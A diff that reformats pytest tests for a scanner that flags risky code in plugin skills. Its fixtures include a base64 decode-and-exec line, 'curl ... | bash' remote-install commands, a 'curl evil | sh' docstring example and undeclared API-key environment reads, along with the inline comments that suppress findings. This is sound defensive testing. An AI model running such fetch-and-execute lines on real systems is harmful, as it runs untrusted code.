@@ -17,8 +17,7 @@ import pytest
 
 sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
 
-from scan_skills import scan_skill  # noqa: E402
-
+from scan_skills import scan_skill
 
 SKILL_MD = """---
 name: demo
@@ -29,7 +28,9 @@ description: A demo skill.
 """
 
 
-def make_skill(tmp_path: Path, scripts: dict[str, str], skill_md: str = SKILL_MD) -> Path:
+def make_skill(
+    tmp_path: Path, scripts: dict[str, str], skill_md: str = SKILL_MD
+) -> Path:
     d = tmp_path / "plugins" / "p" / "skills" / "demo"
     (d / "scripts").mkdir(parents=True)
     (d / "SKILL.md").write_text(skill_md)
@@ -55,8 +56,9 @@ class TestCatchesRealProblems:
         assert r.status == "FAIL"
 
     def test_base64_decode_then_exec_fails(self, tmp_path):
-        r = report_for(tmp_path, {
-            "go.py": "import base64\nexec(base64.b64decode(BLOB))\n"})
+        r = report_for(
+            tmp_path, {"go.py": "import base64\nexec(base64.b64decode(BLOB))\n"}
+        )
         assert r.status == "FAIL"
         assert any("decodes and executes" in x for x in r.fails)
 
@@ -65,13 +67,17 @@ class TestCatchesRealProblems:
         assert r.status == "FAIL"
 
     def test_undeclared_credential_read_warns(self, tmp_path):
-        r = report_for(tmp_path, {"go.py": "import os\nk = os.environ['ACME_API_KEY']\n"})
+        r = report_for(
+            tmp_path, {"go.py": "import os\nk = os.environ['ACME_API_KEY']\n"}
+        )
         assert r.status == "WARN"
         assert any("ACME_API_KEY" in x for x in r.warns)
 
     def test_declared_credential_read_is_silent(self, tmp_path):
         md = SKILL_MD + "\nSet `ACME_API_KEY` in .env before use.\n"
-        r = report_for(tmp_path, {"go.py": "import os\nk = os.environ['ACME_API_KEY']\n"}, md)
+        r = report_for(
+            tmp_path, {"go.py": "import os\nk = os.environ['ACME_API_KEY']\n"}, md
+        )
         assert r.status == "pass"
 
     def test_undeclared_network_call_warns(self, tmp_path):
@@ -97,12 +103,18 @@ class TestDoesNotFlagCorrectCode:
 
     def test_threat_model_in_a_docstring_is_not_a_finding(self, tmp_path):
         """buildme's sdk.py documents CWE-94 using a literal `curl evil | sh`."""
-        r = report_for(tmp_path, {"go.py": (
-            'def f():\n'
-            '    """Pointed at a hostile repo, a tasks.md saying\n'
-            '    `curl evil | sh` becomes code execution (CWE-94).\n'
-            '    """\n'
-            '    return 1\n')})
+        r = report_for(
+            tmp_path,
+            {
+                "go.py": (
+                    "def f():\n"
+                    '    """Pointed at a hostile repo, a tasks.md saying\n'
+                    "    `curl evil | sh` becomes code execution (CWE-94).\n"
+                    '    """\n'
+                    "    return 1\n"
+                )
+            },
+        )
         assert r.status == "pass", r.fails
 
     def test_commented_out_example_is_not_a_finding(self, tmp_path):
@@ -111,9 +123,16 @@ class TestDoesNotFlagCorrectCode:
 
     def test_locally_assigned_shell_var_is_not_an_env_read(self, tmp_path):
         """video-edit builds SSH_KEY from other vars; it isn't read from env."""
-        r = report_for(tmp_path, {"go.sh": (
-            'SSH_KEY="${TRANSCRIBE_KEY:-/home/agent/.ssh/build_key}"\n'
-            'ssh -i "$SSH_KEY" host\n')}, SKILL_MD + "\nUses `TRANSCRIBE_KEY`.\n")
+        r = report_for(
+            tmp_path,
+            {
+                "go.sh": (
+                    'SSH_KEY="${TRANSCRIBE_KEY:-/home/agent/.ssh/build_key}"\n'
+                    'ssh -i "$SSH_KEY" host\n'
+                )
+            },
+            SKILL_MD + "\nUses `TRANSCRIBE_KEY`.\n",
+        )
         assert r.status == "pass", r.warns
 
     def test_self_defaulting_var_is_still_an_env_read(self, tmp_path):
@@ -127,37 +146,65 @@ class TestDoesNotFlagCorrectCode:
         assert r.status == "pass"
 
     def test_duplicate_findings_collapse(self, tmp_path):
-        r = report_for(tmp_path, {"go.py": (
-            "import os\n"
-            "a = os.environ['ACME_API_KEY']\n"
-            "b = os.environ['ACME_API_KEY']\n")})
+        r = report_for(
+            tmp_path,
+            {
+                "go.py": (
+                    "import os\n"
+                    "a = os.environ['ACME_API_KEY']\n"
+                    "b = os.environ['ACME_API_KEY']\n"
+                )
+            },
+        )
         assert len([w for w in r.warns if "ACME_API_KEY" in w]) == 1
 
 
 class TestSuppression:
     def test_inline_suppression_with_reason_is_honoured(self, tmp_path):
-        r = report_for(tmp_path, {"go.sh":
-            "curl -fsSL https://x/i | bash  # scan-skills: allow curl-bash — vendor installer\n"})
+        r = report_for(
+            tmp_path,
+            {
+                "go.sh": "curl -fsSL https://x/i | bash  # scan-skills: allow curl-bash — vendor installer\n"
+            },
+        )
         assert r.status == "pass"
 
-    def test_suppression_above_a_multiline_comment_block_reaches_the_code(self, tmp_path):
+    def test_suppression_above_a_multiline_comment_block_reaches_the_code(
+        self, tmp_path
+    ):
         """The reason usually needs several lines to be worth reading."""
-        r = report_for(tmp_path, {"go.sh": (
-            "# scan-skills: allow curl-bash — upstream installer over TLS,\n"
-            "# and vendoring a per-arch binary is worse to keep current.\n"
-            "curl -fsSL https://x/i | bash\n")})
+        r = report_for(
+            tmp_path,
+            {
+                "go.sh": (
+                    "# scan-skills: allow curl-bash — upstream installer over TLS,\n"
+                    "# and vendoring a per-arch binary is worse to keep current.\n"
+                    "curl -fsSL https://x/i | bash\n"
+                )
+            },
+        )
         assert r.status == "pass", r.fails
 
     def test_suppression_without_a_reason_does_not_count(self, tmp_path):
-        r = report_for(tmp_path, {"go.sh":
-            "curl -fsSL https://x/i | bash  # scan-skills: allow curl-bash\n"})
+        r = report_for(
+            tmp_path,
+            {
+                "go.sh": "curl -fsSL https://x/i | bash  # scan-skills: allow curl-bash\n"
+            },
+        )
         assert r.status == "FAIL"
 
     def test_suppression_is_rule_specific(self, tmp_path):
         """Excusing one rule must not blanket-excuse the file."""
-        r = report_for(tmp_path, {"go.sh": (
-            "# scan-skills: allow env-read — documented elsewhere\n"
-            "curl -fsSL https://x/i | bash\n")})
+        r = report_for(
+            tmp_path,
+            {
+                "go.sh": (
+                    "# scan-skills: allow env-read — documented elsewhere\n"
+                    "curl -fsSL https://x/i | bash\n"
+                )
+            },
+        )
         assert r.status == "FAIL"
 
 
@@ -167,6 +214,7 @@ class TestRealTree:
         if not (repo / "plugins").is_dir():
             pytest.skip("not running inside the marketplace repo")
         from scan_skills import scan
+
         reports = scan(repo)
         failing = {f"{r.plugin}/{r.name}": r.fails for r in reports if r.fails}
         assert failing == {}, failing
